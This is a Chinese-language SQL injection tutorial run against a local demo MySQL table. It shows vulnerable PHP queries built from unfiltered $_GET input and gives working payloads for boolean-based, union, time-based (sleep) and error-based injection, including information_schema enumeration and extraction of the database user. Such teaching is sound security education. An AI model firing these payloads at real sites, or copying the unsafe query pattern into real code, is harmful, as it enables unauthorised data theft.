##SQL注入是如何产生的  
SQL注入的根本原因是不安全的操作被带入到数据库中。  
SQL注入从根源上可以分为int类型和string类型。  
1)int类型  

    "select name from students where id = $_GET['id']"
这是一个典型的未经任何过滤的注入，如果用户提交`id=-1 union select user()` ，将返回当前用户。  
2)string类型  

    "select name from students where area = '$_GET['area']'"
string型注入需要使用单/双引号闭合语句。如`area=%27 union select user()%23`。  
在此基础上衍生出报错注入，延时注入，联合注入，编码注入，  

##Boolean-based   
首先不得不讲SQL中的AND和OR  
AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。
AND:返回第一个条件和第二个条件都成立的记录。  
OR:返回满足第一个条件或第二个条件的记录。  
*AND和OR即为集合论中的交集和并集*  

    mysql> select * from students;
    +-------+-------+-----+
    | id    | name  | age |
    +-------+-------+-----+
    | 10056 | Doris |  20 |
    | 10058 | Jaune |  22 |
    | 10060 | Alisa |  29 |
    +-------+-------+-----+
    3 rows in set (0.00 sec)


思考以下语句：  
1)  

    mysql> select * from students where TRUE ;
    +-------+-------+-----+
    | id    | name  | age |
    +-------+-------+-----+
    | 10056 | Doris |  20 |
    | 10058 | Jaune |  22 |
    | 10060 | Alisa |  29 |
    +-------+-------+-----+
    3 rows in set (0.00 sec)

2)  

    mysql> select * from students where FALSE ;
    Empty set (0.00 sec)


3)  

    mysql> SELECT * from students where id = 10056 and TRUE ;
    +-------+-------+-----+
    | id    | name  | age |
    +-------+-------+-----+
    | 10056 | Doris |  20 |
    +-------+-------+-----+
    1 row in set (0.00 sec)  
    
4)  
    
    mysql> select * from students where id = 10056 and FALSE ;
    Empty set (0.00 sec)  
5)  

    mysql> selcet * from students where id = 10056 or TRUE ;
    +-------+-------+-----+
    | id    | name  | age |
    +-------+-------+-----+
    | 10056 | Doris |  20 |
    | 10058 | Jaune |  22 |
    | 10060 | Alisa |  29 |
    +-------+-------+-----+
    3 rows in set (0.00 sec)  
    
6)

    mysql> select * from students where id = 10056 or FALSE ;
    +-------+-------+-----+
    | id    | name  | age |
    +-------+-------+-----+
    | 10056 | Doris |  20 |
    +-------+-------+-----+
    1 row in set (0.00 sec)  

**如果你足够细心，你便会发现and 1=1 , and 1=2 即是 and TRUE , and FALSE 的变种**  
这便是最基础的boolean注入,以此为基础你可以自由组合语句，如  
字典爆破流  
`and exists(select * from ?)     //?为猜测的表名`    
`and exists(select ? from x)     //?为猜测的列名`  
截取二分流  
`and (length((select schema_name from information_schema.schemata limit 1))>?)       //判断数据库名的长度`  
`and (substr((select schema_name from information_schema.schemata limit 1),1,1)>'?')`     
`and (substr((select schema_name from information_schema.schemata limit 1),1,1)<'?')      //利用二分法判断第一个字符`  
*真爱生命，使用脚本*  

##Union  
比起多重嵌套的boolean注入，union注入相对轻松。因为，union注入可以直接返回信息而不是布尔值。  
1)  

    mysql> select name from students where id = -1 union select schema_name from information_schema.schemata;   //数据库名  
    +--------------------+
    | name               |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | rumRaisin          |
    | t3st               |
    | test               |
    +--------------------+
    6 rows in set (0.00 sec)  

2)  

    mysql> select name from students where id = -1 union select table_name from information_schema.tables where table_schema='t3st';    //表名
    +----------+
    | name     |
    +----------+
    | master   |
    | students |
    +----------+
    2 rows in set (0.00 sec)  
    
3)  
    
    mysql> select name from students where id = -1 union select column_name from information_schema.columns where table_name = 'students' ;     //列名
    +------+
    | name |
    +------+
    | id   |
    | name |
    | age  |
    +------+
    3 rows in set (0.00 sec)  

UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。所以你如果想要使用union查询来进行注入，你首先要猜测后端查询语句中查询了多少列，哪些列可以回显给用户。  
猜测列数  

    union select 1
    union select 1,2
    union select 1,2,3
    //直到页面正常显示  
    
##Time-based  

    mysql> select name from students where id = 10056 or (select * from (select(sleep(5)))A) ;
    +-------+
    | name  |
    +-------+
    | Doris |
    +-------+
    1 row in set (5.00 sec)  

显然我们经过了5s的延迟才返回了数据结果。  

我们可以结合if语句来进行延时注入  

    mysql> select name from students where id = 10056 and if (exists(select * from students),sleep(3),1) ;
    Empty set (3.00 sec)

##Error-based  
根据错误信息提取数据:)  

    mysql> select name from students where id = 10056 and (select ~0+!(select*from(select user())x)) ;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'

